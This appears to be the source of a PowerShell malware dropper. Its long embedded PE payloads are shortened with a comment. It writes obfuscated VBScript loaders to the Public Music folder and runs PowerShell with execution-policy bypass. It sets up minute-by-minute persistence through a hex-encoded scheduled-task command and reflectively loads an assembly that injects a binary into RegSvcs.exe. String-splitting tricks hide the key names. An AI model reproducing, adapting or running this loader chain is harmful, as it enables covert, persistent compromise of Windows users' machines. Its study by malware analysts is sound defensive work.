$Content = @'
on error resume next
on error resume next
WScript.Sleep 6000
on error resume next
on error resume next
on error resume next
on error resume next
uAJ = replace("W375cript.375hEll","375","s")
Set ZEZ = CreateObject(uAJ )
qLv = Replace("POW091RSH091LL","091","E")
ZEZZEZ364 = " -ExecutionPolicy Bypass $a='ReadAllText';$T='C:\Users\Public\Music\Report.ps1'"
Gx1 = ";IEx([IO.File]::$a($T))"
ZEZ.Run(qLv+ZEZZEZ364+Gx1+""),0
'@
[IO.File]::WriteAllText("C:\Users\Public\Music\Loader.vbs", $Content)
$Content = @'
on error resume next
WScript.Sleep 9000
on error resume next
on error resume next
uAJ = replace("W375cript.375hEll","375","s")
Set ZEZ = CreateObject(uAJ )
qLv = Replace("POW091RSH091LL","091","E")
ZEZZEZ364 = " -ExecutionPolicy Bypass $a='ReadAllText';$T='C:\Users\Public\Music\install.ps1'"
Gx1 = ";IEx([IO.File]::$a($T))"
ZEZ.Run(qLv+ZEZZEZ364+Gx1+""),0
'@
[IO.File]::WriteAllText("C:\Users\Public\Music\install.vbs", $Content)
$Content = @'
Try{
function x {
param($TY09)$TY09 = $TY09 -split '(..)' | ? { $_ }
$ia = [Convert]
ForEach ($UX2 in $TY09){$ia::ToInt32($UX2,16)}}
[byte[]] $MyS  = x('4D5A9...000')  # The omitted '4D5A9...000' is actually a 163841 character long hexadecimal/Base64 string.
[byte[]] $serv  = x('4D5A9...000')  # The omitted '4D5A9...000' is actually a 126971 character long hexadecimal/Base64 string.
}catch{}
$T = 'Get'
$M = $T + 'Method'
$I = 'Invoke'
$T = $T + 'Type'
$L = 'Load'
$Q0 = [Reflection.Assembly]
$B = $Q0::$L($MyS)
$B = $B.$T('NewPE2.PE')
$B = $B.$M('Execute')
$Ub = 'C:\Windows\Microsoft'
$z = $Ub + '.NET\Framewor'
$VT = $z + 'k\v4.0.30'
$XQ = $VT + '319\RegSvcs.exe'
$B = $B.$I($null,[object[]] ($XQ,$serv))
'@
[IO.File]::WriteAllText("C:\Users\Public\Music\Report.ps1", $Content)
function go {
param($Y6c)$Y6c = $Y6c -split '(..)' | ? { $_ }
ForEach ($chrome in $Y6c){[Convert]::ToInt32($chrome,16)}}
[byte[]] $bytes2  = go('747279200D0A7B0D0A7363687461736B732E657865202F637265617465202F746E2072656379636C65202F7363206D696E75746520202F6D6F2031202F74722022433A5C55736572735C5075626C69635C4D757369635C4C6F616465722E766273220D0A7D206361746368207B207D')
[io.file]::WriteAllBytes("C:\Users\Public\Music\install.ps1",$bytes2)
Start-Sleep 6
start "C:\Users\Public\Music\install.vbs"